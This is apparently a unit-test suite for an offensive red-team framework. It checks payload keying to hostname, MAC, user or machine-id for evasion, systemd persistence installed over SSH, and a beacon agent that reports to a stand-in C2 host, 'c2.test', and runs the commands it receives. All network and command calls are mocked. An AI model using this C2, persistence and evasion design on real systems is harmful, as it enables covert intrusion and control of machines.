"""Hermetic contracts for payload preparation and delivery support modules."""

from __future__ import annotations

import base64
import builtins
import importlib.util
import subprocess
from pathlib import Path

import pytest

from modules.evasion.payload_keying import PayloadKeying, PayloadKeyingPlugin
from modules.persistence.systemd import SystemdPersistence
from payloads import agent as agent_module

pytestmark = [pytest.mark.unit, pytest.mark.security]


def test_payload_keying_round_trips_every_environment_source(monkeypatch) -> None:
    keying = PayloadKeying()
    monkeypatch.setattr("modules.evasion.payload_keying.os.urandom", lambda size: b"n" * size)
    payload = b"fixture payload"

    cases = [
        (keying.key_to_hostname(payload, " Host-A "), keying._derive_key("host-a")),
        (keying.key_to_mac(payload, "AA-BB-CC-DD-EE-FF"), keying._derive_key("aa:bb:cc:dd:ee:ff")),
        (keying.key_to_user(payload, " Admin "), keying._derive_key("admin")),
        (keying.key_to_machine_id(payload, " machine-id \n"), keying._derive_key("machine-id")),
        (
            keying.key_to_multi(payload, "Host-A", "Admin", "AA:BB"),
            keying._derive_key("host-a|admin|aa:bb", salt="octopus_multi_v8"),
        ),
    ]

    assert all(keying._decrypt(encrypted, key) == payload for encrypted, key in cases)


@pytest.mark.parametrize(
    ("source", "needle", "salt"),
    [
        ("hostname", "socket.gethostname", "octopus_v8"),
        ("mac", "uuid.getnode", "octopus_v8"),
        ("user", "getpass.getuser", "octopus_v8"),
        ("machine_id", "/etc/machine-id", "octopus_v8"),
        ("multi", "socket, getpass, uuid", "octopus_multi_v8"),
        ("unknown", "socket.gethostname", "octopus_v8"),
    ],
)
def test_payload_loader_selects_source_and_embeds_ciphertext(
    source: str,
    needle: str,
    salt: str,
) -> None:
    loader = PayloadKeying().generate_loader(b"encrypted-fixture", source)

    assert needle in loader
    assert f'salt="{salt}"' in loader
    assert base64.b64encode(b"encrypted-fixture").decode() in loader


@pytest.mark.parametrize(
    ("target_info", "expected_source"),
    [
        ({"hostname": "host", "username": "user", "mac": "aa:bb"}, "multi"),
        ({"machine_id": "machine"}, "machine_id"),
        ({"hostname": "host"}, "hostname"),
        ({"username": "user"}, "user"),
    ],
)
def test_payload_keying_strategy_uses_best_available_identity(
    monkeypatch,
    target_info: dict,
    expected_source: str,
) -> None:
    keying = PayloadKeying()
    calls = []
    monkeypatch.setattr(keying, "key_to_multi", lambda payload, *args: calls.append(("multi", args)) or b"multi")
    monkeypatch.setattr(keying, "key_to_machine_id", lambda payload, value: calls.append(("machine_id", value)) or b"machine")
    monkeypatch.setattr(keying, "key_to_hostname", lambda payload, value: calls.append(("hostname", value)) or b"host")
    monkeypatch.setattr(keying, "key_to_user", lambda payload, value: calls.append(("user", value)) or b"user")
    monkeypatch.setattr(
        keying,
        "generate_loader",
        lambda payload, source: calls.append(("loader", payload, source)) or f"loader:{source}",
    )

    keyed, loader = keying.key_payload_for_target(b"payload", target_info)

    assert calls[0][0] == expected_source
    assert calls[-1][-1] == expected_source
    assert keyed and loader == f"loader:{expected_source}"


def test_payload_keying_without_target_data_is_explicitly_unkeyed(capsys) -> None:
    payload = b"payload"
    assert PayloadKeying().key_payload_for_target(payload, {}) == (payload, "")
    assert "payload will be unkeyed" in capsys.readouterr().out


def test_payload_keying_plugin_validates_inputs_and_writes_optional_loader(
    monkeypatch,
    tmp_path,
) -> None:
    plugin = PayloadKeyingPlugin()
    assert plugin.run().error == "payload bytes or string are required"
    assert plugin.run(payload=b"x", target_info=[]).error == "target_info must be a dict"

    monkeypatch.setattr(
        PayloadKeying,
        "key_payload_for_target",
        lambda self, payload, target_info: (b"keyed", "loader source"),
    )
    output = tmp_path / "loader.py"
    result = plugin.run(
        payload="plaintext",
        target_info={"hostname": "host"},
        output_path=str(output),
    )
    assert result.success is True
    assert result.data == {
        "payload_len": 9,
        "keyed_payload_len": 5,
        "loader_len": 13,
        "keyed_payload_b64": base64.b64encode(b"keyed").decode("ascii"),
    }
    assert result.artifacts == [str(output)]
    assert output.read_text(encoding="utf-8") == "loader source"

    bytes_result = plugin.run(payload=b"bytes", target_info={})
    assert bytes_result.success is True
    assert bytes_result.artifacts == []


class SSHClient:
    def __init__(self) -> None:
        self.closed = False

    def close(self) -> None:
        self.closed = True


def test_systemd_persistence_validates_serializable_ssh_credentials(monkeypatch) -> None:
    plugin = SystemdPersistence()
    for kwargs in (
        {},
        {"target": "host", "password": "secret"},
        {"target": "host", "username": "user"},
    ):
        assert "Requires target" in plugin.run(**kwargs).error

    import core.killchain.ssh_helpers as ssh_helpers

    monkeypatch.setattr(
        ssh_helpers,
        "_ssh_connect",
        lambda host, user, password, port: (None, "connection refused"),
    )
    failed = plugin.run(target="host", user="user", pwd="secret", port="2222")
    assert failed.error == "SSH connection failed: connection refused"


def test_systemd_persistence_writes_enables_starts_and_closes_owned_client(monkeypatch) -> None:
    import core.killchain.ssh_helpers as ssh_helpers

    plugin = SystemdPersistence()
    client = SSHClient()
    connects = []
    commands = []
    monkeypatch.setattr(
        ssh_helpers,
        "_ssh_connect",
        lambda host, user, password, port: (
            connects.append((host, user, password, port)) or client,
            None,
        ),
    )
    monkeypatch.setattr(
        ssh_helpers,
        "_ssh_exec",
        lambda selected_client, command: commands.append((selected_client, command)) or "written",
    )

    result = plugin.run(
        target="host",
        username="user",
        password="secret",
        payload_path="/opt/agent",
        service_name="fixture.service",
    )

    assert result.success is True
    assert result.output == "written"
    assert result.data == {
        "service": "fixture.service",
        "path": "/etc/systemd/system/fixture.service",
        "target": "host",
    }
    assert connects == [("host", "user", "secret", 22)]
    decoded_service = base64.b64decode(commands[0][1].split("'")[3]).decode()
    assert "ExecStart=/opt/agent" in decoded_service
    assert [command for _client, command in commands[1:]] == [
        "systemctl daemon-reload",
        "systemctl enable fixture.service",
        "systemctl start fixture.service",
    ]
    assert client.closed is True


def test_systemd_persistence_reuses_external_client_and_contains_execution_errors(monkeypatch) -> None:
    import core.killchain.ssh_helpers as ssh_helpers

    client = SSHClient()
    monkeypatch.setattr(
        ssh_helpers,
        "_ssh_exec",
        lambda *_args: (_ for _ in ()).throw(RuntimeError("write failed")),
    )

    result = SystemdPersistence().run(target="host", ssh_client=client)

    assert result.success is False
    assert result.error == "write failed"
    assert client.closed is False


class Response:
    def __init__(self, status_code: int, payload: dict | None = None) -> None:
        self.status_code = status_code
        self._payload = payload or {}

    def json(self) -> dict:
        return self._payload


class Session:
    def __init__(self) -> None:
        self.verify = True
        self.responses: list[Response | Exception] = []
        self.posts = []

    def post(self, url, **kwargs):
        self.posts.append((url, kwargs))
        response = self.responses.pop(0)
        if isinstance(response, Exception):
            raise response
        return response


def _agent(monkeypatch, *, tls: bool = False):
    session = Session()
    monkeypatch.setattr(agent_module.requests, "Session", lambda: session)
    agent = agent_module.BeaconAgent("c2.test", 8443, "01" * 32, use_tls=tls)
    return agent, session


def test_beacon_agent_crypto_initialization_and_system_information(monkeypatch) -> None:
    agent, session = _agent(monkeypatch)
    secure, secure_session = _agent(monkeypatch, tls=True)
    assert agent.c2_url == "http://c2.test:8443"
    assert secure.c2_url == "https://c2.test:8443"
    assert session.verify is False and secure_session.verify is False

    encrypted = agent.encrypt({"fixture": True})
    assert agent.decrypt(encrypted) == {"fixture": True}
    assert agent.decrypt(base64.b64encode(b"short").decode()) == {}

    monkeypatch.setattr(agent_module.socket, "gethostname", lambda: "host")
    monkeypatch.setattr(agent_module.platform, "system", lambda: "TestOS")
    monkeypatch.setattr(agent_module.platform, "release", lambda: "1.0")
    monkeypatch.setattr(agent_module.platform, "machine", lambda: "arm64")
    monkeypatch.setenv("USER", "alice")
    assert agent.collect_sysinfo() == {
        "hostname": "host",
        "os": "TestOS 1.0",
        "user": "alice",
        "arch": "arm64",
    }
    monkeypatch.delenv("USER")
    monkeypatch.setenv("USERNAME", "bob")
    assert agent.collect_sysinfo()["user"] == "bob"
    monkeypatch.delenv("USERNAME")
    assert agent.collect_sysinfo()["user"] == "unknown"


def test_beacon_agent_registration_success_non_success_and_exception(monkeypatch, caplog) -> None:
    agent, session = _agent(monkeypatch)
    agent.encrypt = lambda data: "encrypted"
    agent.decrypt = lambda data: {
        "agent_id": "agent-1",
        "interval": 15,
        "jitter": 3,
    }
    session.responses.append(Response(200, {"data": "reply"}))
    assert agent.register() is True
    assert (agent.agent_id, agent.interval, agent.jitter) == ("agent-1", 15, 3)

    default_agent, default_session = _agent(monkeypatch)
    default_agent.encrypt = lambda data: "encrypted"
    default_agent.decrypt = lambda data: {}
    default_session.responses.append(Response(200, {}))
    assert default_agent.register() is True
    assert (default_agent.interval, default_agent.jitter) == (60, 10)

    denied_agent, denied_session = _agent(monkeypatch)
    denied_session.responses.append(Response(503))
    assert denied_agent.register() is False

    error_agent, error_session = _agent(monkeypatch)
    error_session.responses.append(RuntimeError("offline"))
    with caplog.at_level("DEBUG"):
        assert error_agent.register() is False
    assert "offline" in caplog.text


def test_beacon_agent_execute_task_classifies_all_subprocess_outcomes(monkeypatch) -> None:
    agent, _session = _agent(monkeypatch)
    monkeypatch.setattr(agent_module.subprocess, "check_output", lambda *args, **kwargs: b"ok\xff")
    assert agent.execute_task("ok") == {"command": "ok", "output": "ok�"}

    def called_process(*_args, **_kwargs):
        raise subprocess.CalledProcessError(1, "bad", output=b"failed")

    monkeypatch.setattr(agent_module.subprocess, "check_output", called_process)
    assert agent.execute_task("bad")["output"] == "failed"
    monkeypatch.setattr(
        agent_module.subprocess,
        "check_output",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(subprocess.TimeoutExpired("slow", 60)),
    )
    assert agent.execute_task("slow")["output"] == "[!] Command timed out."
    monkeypatch.setattr(
        agent_module.subprocess,
        "check_output",
        lambda *_args, **_kwargs: (_ for _ in ()).throw(RuntimeError("broken")),
    )
    assert agent.execute_task("broken")["output"] == "[!] Execution failed: broken"


def test_beacon_handles_state_results_tasks_recursion_and_network_errors(monkeypatch) -> None:
    agent, session = _agent(monkeypatch)
    assert agent.beacon() is None

    agent.agent_id = "agent-1"
    agent.encrypt = lambda data: f"encrypted:{sorted(data)}"
    agent.decrypt = lambda data: (
        {"tasks": [{"task_id": "task-1", "command": "whoami"}]}
        if data == "tasks"
        else {"tasks": []}
    )
    agent.execute_task = lambda command: {"command": command, "output": "alice"}
    session.responses.extend(
        [
            Response(200, {"data": "tasks"}),
            Response(204),
            Response(200, {"data": "empty"}),
            Response(503),
        ]
    )
    agent.beacon()
    assert len(session.posts) == 2
    recursive_payload = session.posts[1][1]["json"]["data"]
    assert "results" in recursive_payload

    agent.beacon(results=[])
    agent.beacon()
    session.responses.append(RuntimeError("offline"))
    assert agent.beacon(results=[{"task_id": "x"}]) is None


def test_beacon_run_retries_registration_then_applies_minimum_jitter(monkeypatch) -> None:
    agent, _session = _agent(monkeypatch)
    registrations = iter((False, True))
    agent.register = lambda: next(registrations)
    sleeps = []
    monkeypatch.setattr(agent_module.time, "sleep", lambda value: sleeps.append(value))
    monkeypatch.setattr(agent_module.random, "uniform", lambda low, high: -1000)
    agent.beacon = lambda: (_ for _ in ()).throw(RuntimeError("stop loop"))

    with pytest.raises(RuntimeError, match="stop loop"):
        agent.run()
    assert sleeps == [60, 10]


def test_agent_module_tolerates_missing_optional_http_dependency(monkeypatch) -> None:
    path = Path(agent_module.__file__)
    real_import = builtins.__import__

    def missing_requests(name, globals=None, locals=None, fromlist=(), level=0):
        if name == "requests":
            raise ImportError("requests unavailable")
        return real_import(name, globals, locals, fromlist, level)

    monkeypatch.setattr(builtins, "__import__", missing_requests)
    spec = importlib.util.spec_from_file_location("payload_agent_without_requests", path)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    assert hasattr(module, "BeaconAgent")
